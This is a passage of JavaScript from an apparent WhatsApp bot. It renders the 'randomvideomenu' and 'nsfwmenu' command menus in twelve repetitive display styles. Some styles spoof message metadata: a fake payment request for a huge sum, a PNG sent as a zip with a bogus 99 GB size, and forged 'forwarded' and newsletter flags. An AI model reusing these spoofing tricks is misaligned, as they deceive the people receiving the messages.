          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomvideomenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'nsfwmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
